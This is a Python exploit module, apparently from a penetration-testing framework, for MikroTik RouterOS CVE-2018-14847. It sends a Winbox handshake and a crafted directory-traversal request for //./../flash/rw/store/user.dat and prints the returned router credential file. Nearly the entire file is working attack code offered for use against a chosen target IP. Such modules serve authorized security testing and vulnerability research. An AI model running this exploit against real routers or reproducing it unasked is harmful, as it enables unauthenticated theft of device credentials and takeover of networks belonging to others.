# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """MikroTik RouterOS Winbox Directory Traversal / Auth Bypass (CVE-2018-14847).

    MikroTik RouterOS before 6.42.7 (stable) and 6.40.9 (long-term)
    allows unauthenticated remote attackers to read arbitrary files via
    a directory traversal vulnerability in the Winbox service on TCP/8291.

    By requesting the path //./../flash/rw/store/user.dat, an attacker
    can extract the credential database containing all usernames and
    passwords (encoded, not hashed) from the device.

    This vulnerability was mass-exploited for cryptomining campaigns
    affecting hundreds of thousands of routers worldwide.

    CVSS v3.1: 9.1 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "MikroTik RouterOS Winbox Auth Bypass / File Read (CVE-2018-14847)",
        "description": (
            "Exploits CVE-2018-14847, a directory traversal in the MikroTik "
            "Winbox service (TCP/8291) that allows unauthenticated file read. "
            "Extracts /flash/rw/store/user.dat containing all router credentials "
            "in an encoded (not hashed) format, effectively bypassing "
            "authentication. Mass-exploited for cryptomining in 2018."
        ),
        "authors": (
            "Tenable Research (public disclosure)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2018-14847",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14847",
            "https://blog.mikrotik.com/security/winbox-vulnerability.html",
            "https://www.tenable.com/blog/mikrotik-router-bug-cve-2018-14847",
        ),
        "devices": (
            "MikroTik RouterOS < 6.42.7 (stable)",
            "MikroTik RouterOS < 6.40.9 (long-term)",
            "All RouterBoard models with Winbox enabled",
        ),
    }

    target = OptIP("", "Target IPv4 address of the MikroTik router")
    port = OptPort(8291, "Winbox service port (default 8291)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")

    _WINBOX_HELLO = bytes([
        0x06, 0x00, 0x68, 0x01, 0x00, 0x66, 0x4d, 0x32,
    ])

    _FILE_REQUEST_PREFIX = bytes([
        0x37, 0x00,
        0x00, 0x20, 0x4d, 0x32, 0x05, 0x00, 0xff, 0x01,
        0x06, 0x00, 0xff, 0x09, 0x05,
        0x07, 0x00, 0xff, 0x09, 0x07,
        0x01, 0x00, 0x00, 0x21, 0x02,
        0x00, 0x00, 0x08, 0x00, 0x00, 0x80, 0x00, 0x00,
        0x08, 0x02, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00,
        0x00, 0x08,
    ])

    _TRAVERSAL_PATH = b"//./../flash/rw/store/user.dat"

    def _build_file_request(self) -> bytes:
        """Build a Winbox protocol request to read a file via traversal."""
        path_bytes = self._TRAVERSAL_PATH
        path_len = len(path_bytes)
        header = struct.pack("!H", path_len + len(self._FILE_REQUEST_PREFIX) + 2)
        return header + self._FILE_REQUEST_PREFIX + struct.pack("B", path_len) + path_bytes

    def _send_recv(self, sock: socket.socket, data: bytes) -> bytes:
        sock.sendall(data)
        time.sleep(0.3)
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 16384:
                    break
        except (TimeoutError, OSError):
            pass
        return response

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to have Winbox on TCP/{self.port}"
            )
            return

        print_success("Winbox service confirmed; attempting file read via traversal")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Connect to Winbox port and perform the initial handshake."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.sendall(self._WINBOX_HELLO)
            response = b""
            try:
                response = sock.recv(1024)
            except TimeoutError:
                pass
            sock.close()
            return len(response) > 0
        except Exception:
            return False

    def _exploit(self) -> None:
        print_status(
            f"Connecting to Winbox at {self.target}:{self.port} and "
            f"requesting {self._TRAVERSAL_PATH.decode()}"
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
        except Exception as e:
            print_error(f"Connection failed: {e}")
            return

        try:
            hello_resp = self._send_recv(sock, self._WINBOX_HELLO)
            if not hello_resp:
                print_error("No response to Winbox handshake")
                return

            print_info(f"Handshake response: {len(hello_resp)} bytes")

            file_req = self._build_file_request()
            file_resp = self._send_recv(sock, file_req)

            if file_resp and len(file_resp) > 20:
                print_success(
                    f"File data received: {len(file_resp)} bytes. "
                    "user.dat extracted via directory traversal."
                )
                printable = bytes(
                    b if 0x20 <= b < 0x7f else 0x2e for b in file_resp[:128]
                )
                print_info(f"Preview (hex): {file_resp[:64].hex()}")
                print_info(f"Preview (ascii): {printable.decode()}")
            elif file_resp:
                print_info(
                    f"Response received ({len(file_resp)} bytes) but may be "
                    "an error or empty file. Target could be patched."
                )
            else:
                print_info(
                    "No file data received. Target may be running a "
                    "patched RouterOS version."
                )
        finally:
            sock.close()
